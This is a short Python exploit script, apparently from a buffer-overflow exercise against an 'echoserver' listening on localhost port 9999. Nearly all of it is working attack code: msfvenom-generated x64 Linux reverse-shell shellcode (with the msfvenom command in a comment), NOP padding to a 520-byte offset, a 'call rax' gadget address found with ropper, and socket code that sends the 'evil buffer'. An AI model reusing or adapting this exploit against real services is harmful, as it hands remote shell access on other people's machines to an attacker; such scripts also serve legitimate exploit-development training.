#!/usr/bin/env python
import socket
from struct import pack
ip = "127.0.0.1"
port = 9999



#/opt/metasploit-framework/msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=22 -b "\x00\x20\x0a\x0d" -f py
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x3a\xda\x65\xa4\x34\xf4\x61"
buf += b"\x37\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x50\xf3\x3d\x3d\x5e\xf6\x3e\x5d\x3b\x84\x6a\xa1\x7c"
buf += b"\x63\x29\x8e\x38\xda\x65\xb2\x4b\xf4\x61\x36\x6b\x92"
buf += b"\xec\x42\x5e\xe4\x3b\x5d\x10\x82\x6a\xa1\x5e\xf7\x3f"
buf += b"\x7f\xc5\x14\x0f\x85\x6c\xfb\x64\x42\xcc\xb0\x5e\xfc"
buf += b"\xad\xbc\xda\x18\x58\xb3\x0b\x8b\x47\x9c\x61\x64\x72"
buf += b"\x53\x82\xf6\x63\xbc\xe8\xd1\x35\xdf\x65\xa4\x34\xf4"
buf += b"\x61\x37"


bufferLenth = 900
offset = 520
junk = b"\x90" * (offset - len(buf))

#ropper -f echoserver --search "call rax"
#0x0000000000401010: call rax;
callrax = pack("<Q", 0x0000000000401010)


buffer = buf + junk + callrax

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + b"\n")
    print("Done, let's rock and roll!")
except:
    print("Could not connect.")
